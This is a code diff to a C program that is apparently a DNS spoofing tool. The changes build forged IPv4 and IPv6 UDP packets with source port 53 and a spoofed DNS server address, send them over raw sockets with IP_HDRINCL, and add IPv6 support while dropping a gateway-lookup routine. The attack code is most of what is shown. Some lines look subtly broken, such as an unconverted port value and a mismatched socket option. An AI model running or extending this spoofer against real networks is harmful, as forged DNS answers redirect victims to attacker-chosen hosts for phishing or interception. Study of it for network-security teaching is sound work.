@@ -21,13 +21,12 @@ int main(int argc, char *argv[]) {
     nic_device = pcap_lookupdev(errbuf);    // get interface
     pcap_lookupnet(nic_device, &netp, &maskp, errbuf);
     get_device_ip(nic_device);
-    find_gateway();
+
     // Confirm
     printf("=================================\n");
     printf("   Request URL : %s\n", opts.request_url);
     printf("   Spoofing IP : %s\n", opts.spoofing_ip);
     printf("   My       IP : %s\n", opts.device_ip);
-    printf("   Gateway  IP : %s\n", opts.gateway_ip);
     printf("=================================\n");
     puts("[ DNS Spoofing Initiated ]");
 
@@ -111,33 +110,6 @@ void get_url_address(void) {
 }
 
 
-void find_gateway(void) {
-    FILE* fp = NULL;
-    char temp[1024] = {0};
-    char* token;
-
-    fp = popen("netstat -rn", "r");
-    while (fgets(temp, sizeof(temp), fp) != NULL) {
-        // Find the line that contains "0.0.0.0" or "default"
-        if (strstr(temp, "0.0.0.0") != NULL || strstr(temp, "default") != NULL) {
-            // Extract the gateway IP address
-            token = strtok(temp, " ");
-            while (token != NULL) {
-                if (strcmp(token, "0.0.0.0") == 0 || strcmp(token, "default") == 0) {
-                    token = strtok(NULL, " ");
-                    printf("Gateway IP: %s\n", token);
-                    strcpy(opts.gateway_ip, token);
-                    break;
-                }
-                token = strtok(NULL, " ");
-            }
-            break;
-        }
-    }
-    pclose(fp);
-}
-
-
 void get_device_ip(char* nic_device) {
     int n;
     struct ifreq ifr;
@@ -176,7 +148,7 @@ void sig_handler(int signum) {
 }
 
 
-void create_header(char* response_packet, uint16_t size_response_payload) {
+void create_ipv4_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
     struct ip *ip_header = (struct ip *) response_packet;
     struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip));
 
@@ -184,19 +156,42 @@ void create_header(char* response_packet, uint16_t size_response_payload) {
     ip_header->ip_hl = 5;
     ip_header->ip_v = 4;
     ip_header->ip_tos = 0;
-    ip_header->ip_id = opts.ipid;
-    ip_header->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + size_response_payload;
+    ip_header->ip_id = 0;
+    ip_header->ip_len = htons(size_response_payload);
     ip_header->ip_off = 0;
     ip_header->ip_ttl = 64;
     ip_header->ip_p = IPPROTO_UDP;
-    ip_header->ip_src.s_addr = host_convert("75.153.171.124");
+    ip_header->ip_src.s_addr = host_convert(opts.dns_ip);
     ip_header->ip_dst.s_addr = host_convert(opts.device_ip);
     ip_header->ip_sum = calc_ip_checksum(ip_header);
 
     /* UDP header */
     udp_header->source = htons(53);
     udp_header->dest = htons(opts.device_port);
-    udp_header->len = htons(sizeof(struct udphdr) + size_response_payload);
+    udp_header->len = htons(sizeof(struct udphdr) + size_dns_payload);
+    udp_header->uh_sum = 0;
+}
+
+
+void create_ipv6_header(char* response_packet, uint16_t size_dns_payload, uint16_t size_response_payload) {
+    struct ip6_hdr *ipv6_header = (struct ip6_hdr *) response_packet;
+    struct udphdr *udp_header = (struct udphdr *) (response_packet + sizeof (struct ip6_hdr));
+    struct in6_addr srcAddr, dstAddr;
+
+    inet_pton(AF_INET6, opts.dns_ipv6, &srcAddr);
+    inet_pton(AF_INET6, opts.device_ipv6, &dstAddr);
+    /* IP header */
+    ipv6_header->ip6_flow = htonl(0x60000000);
+    ipv6_header->ip6_plen = htons(size_response_payload);
+    ipv6_header->ip6_nxt = IPPROTO_UDP;
+    ipv6_header->ip6_hlim = 64;
+    ipv6_header->ip6_src = srcAddr;
+    ipv6_header->ip6_dst = dstAddr;
+
+    /* UDP header */
+    udp_header->source = htons(53);
+    udp_header->dest = htons(opts.device_port);
+    udp_header->len = htons(sizeof(struct udphdr) + size_dns_payload);
     udp_header->uh_sum = 0;
 }
 
@@ -206,18 +201,40 @@ void send_dns_answer(char* response_packet, uint16_t size_response_payload) {
     int bytes_sent;
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     int one = 1;
-    const int *val = &one;
-    int option;
 
     if (sock < 0) {
         fprintf(stderr, "Error creating socket");
         return;
     }
     to_addr.sin_family = AF_INET;
-    to_addr.sin_port = htons(opts.device_port);
-    to_addr.sin_addr.s_addr = inet_addr("75.153.171.124");
+    to_addr.sin_port = 53;
+    to_addr.sin_addr.s_addr = inet_addr(opts.dns_ip);
 
-    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
+    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
+        fprintf(stderr, "Error at setsockopt()");
+        return;
+    }
+
+    bytes_sent = sendto(sock, response_packet, size_response_payload, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
+    if(bytes_sent < 0)
+        fprintf(stderr, "Error sending data");
+}
+
+
+void send_dns_answer2(char* response_packet, uint16_t size_response_payload) {
+    struct sockaddr_in6 to_addr;
+    ssize_t bytes_sent;
+    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
+    int one = 1;
+
+    if (sock < 0) {
+        fprintf(stderr, "Error creating socket");
+        return;
+    }
+    to_addr.sin6_family = AF_INET6;
+    inet_pton(AF_INET6, opts.dns_ipv6, &(to_addr.sin6_addr));
+
+    if(setsockopt(sock, IPPROTO_IPV6, IP_HDRINCL, &one, sizeof(one)) < 0){
         fprintf(stderr, "Error at setsockopt()");
         return;
     }
